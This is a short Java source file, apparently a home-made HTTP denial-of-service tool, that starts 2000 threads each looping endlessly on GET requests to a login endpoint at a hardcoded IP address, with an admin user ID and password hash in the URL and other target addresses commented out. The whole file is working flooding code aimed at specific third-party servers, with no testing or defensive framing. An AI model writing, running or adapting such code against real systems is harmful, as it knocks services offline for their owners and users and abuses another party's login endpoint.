package com.sun.http;

import java.util.concurrent.atomic.AtomicInteger;

public class HttpDDOS implements Runnable {

    private static AtomicInteger atomicInteger = new AtomicInteger();

    @Override
    public void run() {
        while (true) {
            //String URL = "http://175.19.155.39/chk/gainchkcode.do?custno=1&username=a&password2=1";
            String URL = "http://122.112.174.92:8084/emwx/ex/user/login.do?userid=admin&pwd=198b124a8bb843d6f0b466723671ed9d&dynamic_code=&client_token=&host=";
            //String URL = "http://122.112.174.92:8066/project/EMWX/";
            System.out.println(HttpUtil.doGet(URL) + "   " /*+ atomicInteger.incrementAndGet()*/);
        }
    }
}

class Main1 {

    public static void main(String[] args) {

        for (int i = 0; i < 2000; i++) {
            HttpDDOS main = new HttpDDOS();
            Thread thread = new Thread(main);
            thread.start();
        }

    }
}